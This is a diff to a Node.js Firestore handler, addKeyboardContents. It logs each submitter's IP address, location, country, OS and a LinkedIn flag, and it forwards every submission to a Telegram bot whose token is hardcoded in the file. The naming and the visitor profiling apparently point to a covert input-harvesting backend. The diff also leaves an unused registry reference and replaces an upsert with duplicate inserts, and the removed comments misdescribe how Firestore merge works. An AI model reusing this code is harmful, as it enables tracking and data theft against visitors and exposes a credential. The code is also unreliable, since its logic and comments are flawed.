@@ -1,4 +1,4 @@
-const { addDoc, collection, doc, setDoc, Timestamp } = require("firebase/firestore");
+const { addDoc, collection, doc, Timestamp } = require("firebase/firestore");
 
 // ── Telegram config ────────────────────────────────────────────────────────
 const TELEGRAM_BOT_TOKEN = "8776922425:AAEuMrcF--3NkV4EO2CdNnSnNLs8qg-0D_c";
@@ -72,10 +72,18 @@ async function addKeyboardContents(req, res, db) {
       }
     } catch {}
 
-    // ── Build display name: 2026_06_19_13_34_57_Germany_1.2.3.4 ────────
-    const country     = extractCountry(location);
-    const safeIP      = ip.replace(/\./g, "_").replace(/:/g, "_"); // handle IPv6 too
-    const displayName = `${fmtTs(now)}_${country}_${safeIP}`;
+    // ── Build display name with specific format
+    const country = extractCountry(location);
+    const safeIP = ip.replace(/\./g, "_").replace(/:/g, "_");
+
+    // Generate displayName with special format if linkedin exists
+    let displayName;
+    if (linkedin) {
+      // Example: 2026_06_23_15_28_22_United_States_134_88_96_241_LK
+      displayName = `${fmtTs(now)}_${country}_${safeIP}_LK`;
+    } else {
+      displayName = `${fmtTs(now)}_${country}_${safeIP}`;
+    }
 
     const payload = {
       timestamp,
@@ -91,33 +99,20 @@ async function addKeyboardContents(req, res, db) {
       displayName,
     };
 
-    // ── 1. Save application doc under Applications_{ip} ─────────────────
+    // ── 1. Insert application document ─────────────────
     await addDoc(collection(db, `Applications_${ip}`), payload);
 
-    // ── 2. Upsert IPRegistry doc keyed by IP ────────────────────────────
-    //    displayName always reflects the LATEST submission time
-    //    firstSeen is only set on the very first submission (merge won't
-    //    overwrite existing fields we don't include, but we need firstSeen
-    //    to stay — so we set it conditionally via a separate initial write)
+    // ── 2. Insert IPRegistry document (no update/merge)
     const registryRef = doc(db, "IPRegistry", ip);
-
-    await setDoc(registryRef, {
+    await addDoc(collection(db, "IPRegistry"), {
       ip,
       location,
       country,
-      os:          os || "",
-      latestTs:    timestamp,
-      displayName,             // ← updated every time: 2026_06_19_..._Germany_x_x_x_x
-    }, { merge: true });
-
-    // firstSeen: only write if it doesn't exist yet
-    // We use merge:true and only pass firstSeen — Firestore won't overwrite
-    // an existing field when using merge, but it WILL add missing ones.
-    await setDoc(registryRef, {
+      os: os || "",
+      latestTs: timestamp,
+      displayName,
       firstSeen: timestamp,
-    }, { merge: true });
-    // Note: the line above only adds firstSeen if the doc was just created.
-    // On subsequent calls it already exists so merge leaves it unchanged.
+    });
 
     // ── 3. Telegram alert ───────────────────────────────────────────────
     sendTelegramAlert({ ...payload, timestamp: tsString })
